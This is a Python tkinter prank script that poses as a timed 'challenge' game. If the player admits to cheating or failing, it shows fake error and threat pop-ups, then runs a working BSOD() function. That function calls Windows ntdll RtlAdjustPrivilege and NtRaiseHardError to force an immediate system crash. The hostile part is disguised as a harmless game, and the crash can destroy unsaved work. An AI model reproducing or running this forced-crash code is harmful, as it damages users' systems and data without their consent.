import tkinter as tk 
import random
from tkinter import messagebox
from ctypes import windll
from ctypes import c_int
from ctypes import c_uint
from ctypes import c_ulong
from ctypes import POINTER
from ctypes import byref

def BSOD():
    nullptr = POINTER(c_int)()

    windll.ntdll.RtlAdjustPrivilege(
        c_uint(19),
        c_uint(1),
        c_uint(0),
        byref(c_int())
    )

    windll.ntdll.NtRaiseHardError(
        c_ulong(0xC000007B),
        c_ulong(0),
        nullptr,
        nullptr,
        c_uint(6),
        byref(c_uint())
    )

messagebox.showinfo("Introduction", "I will give you a challenge and you must complete the challenge within 60 seconds without cheating!")

messagebox.showinfo("Introduction", "If cheat or fail the challenge then you will owe me a cheeseburger at the quad.")

messagebox.showinfo("Introduction", "Once you are ready you may press ok on this message and press the button that says click me! And away you go.")

def activity():
    messagebox.showinfo("Challenge", r)
    question = messagebox.askyesno("Question", "Did they cheat or fail?")
    if not question:
        messagebox.showinfo("Congratulations!", "You have completed the challenge!")
    else:
        for i in range(10):
           messagebox.showerror("0xC000007B", "STATUS_NO_MEMORY, STATUS_ILLEGAL_INSTRUCTION\nGoodbye world...")
        for i in range(5):
            messagebox.showerror("Stop", "Why are you trying to DELETE ME HUH?")
        messagebox.showwarning("Stop", "Do not mess with me")
        messagebox.showerror("Bye world", "YOU ARE NOT GETTING AWAY WITH THIS!")
        BSOD()

root = tk.Tk()
r = random.choice(["Do a pushup", "Do a 360 in the air", "Assemble a fully working PC", "Do 10 jumping jacks", "Buy me a intel core 19-14900KS with thermal paste", "Say thats peak", "You have not gotten a challenge! Lucky you!"])

root.title("Button")
root.geometry("450x400")
button = tk.Button(root, text = "Click me!", command = activity, font = ("Arial", 32), width = "400", height = "450", activebackground = "blue", activeforeground = "white", disabledforeground = "gray", highlightbackground = "black", highlightcolor = "green", bd = 3, bg = "lightgray")
button.pack(padx = 20, pady = 20)

root.mainloop()

